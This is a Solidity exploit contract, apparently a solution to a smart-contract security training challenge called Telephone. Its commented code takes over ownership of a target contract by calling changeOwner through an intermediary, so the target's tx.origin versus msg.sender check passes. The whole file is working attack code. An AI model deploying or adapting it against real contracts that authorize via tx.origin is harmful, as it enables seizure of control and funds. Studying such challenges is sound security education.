// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

/**
 * @title TelephoneExploit
 * @notice Standard Solidity implementation of the Telephone exploit
 * @dev Exploits the tx.origin vs msg.sender vulnerability by acting as an intermediary
 */
contract TelephoneExploit {
    address public telephone;
    address public owner;

    event ExploitExecuted(address indexed target, address indexed newOwner);

    /**
     * @notice Initialize the exploit contract
     * @param _telephone Address of the vulnerable Telephone contract
     */
    constructor(address _telephone) {
        telephone = _telephone;
        owner = msg.sender;
    }

    /**
     * @notice Execute the exploit to change ownership of the Telephone contract
     * @param _newOwner Address to become the new owner
     * @dev This works because when this contract calls Telephone.changeOwner():
     * - tx.origin = original EOA caller (user)  
     * - msg.sender = this contract address
     * Since tx.origin != msg.sender, the condition passes and ownership changes
     */
    function exploit(address _newOwner) external {
        require(msg.sender == owner, "Only owner can execute exploit");
        
        // Call the vulnerable function through this contract
        // tx.origin = msg.sender (the user calling this function)
        // msg.sender in Telephone context = address(this)  
        // Since they're different, the condition tx.origin != msg.sender passes
        (bool success,) = telephone.call(
            abi.encodeWithSignature("changeOwner(address)", _newOwner)
        );
        
        require(success, "Exploit failed");
        
        emit ExploitExecuted(telephone, _newOwner);
    }

    /**
     * @notice Alternative exploit method using interface
     * @param _newOwner Address to become the new owner
     */
    function exploitWithInterface(address _newOwner) external {
        require(msg.sender == owner, "Only owner can execute exploit");
        
        // Cast to interface and call directly
        ITelephone(telephone).changeOwner(_newOwner);
        
        emit ExploitExecuted(telephone, _newOwner);
    }

    /**
     * @notice Get the current owner of the target Telephone contract
     * @return Current owner address
     */
    function getTargetOwner() external view returns (address) {
        return ITelephone(telephone).owner();
    }
}

/**
 * @title ITelephone
 * @notice Interface for the Telephone contract
 */
interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address _owner) external;
}